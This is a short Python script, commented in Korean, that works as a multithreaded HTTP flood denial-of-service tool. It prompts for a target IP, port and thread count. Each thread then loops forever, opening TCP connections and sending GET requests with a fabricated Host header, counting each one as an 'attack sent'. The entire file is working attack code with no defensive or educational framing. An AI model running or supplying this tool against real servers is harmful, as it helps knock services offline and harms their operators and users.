import socket
import threading
import os

# 사용자 입력 받기
target = input("Insert target’s IP: ").strip()
port = int(input("Insert Port (e.g., 80): ").strip())
Trd = int(input("Insert number of Threads: ").strip())
fake_ip = '44.197.175.168'

# 전역 변수 초기화
attack_num = 0

def attack():
    global attack_num
    while True:
        try:
            # 소켓 생성 및 연결
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            
            # HTTP 요청 전송
            s.sendall(f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n".encode('ascii'))
            s.close()
            
            # 공격 카운터 증가 및 출력
            attack_num += 1
            print(f"Attack sent: {attack_num}")
        except Exception as e:
            print(f"Connection error: {e}")

# 다중 스레드 생성
for i in range(Trd):
    thread = threading.Thread(target=attack)
    thread.start()

# Bash 명령어 실행 (옵션)
os.system("clear")  # 터미널 화면 클리어
os.system("toilet ToolName")  # 텍스트 장식 출력
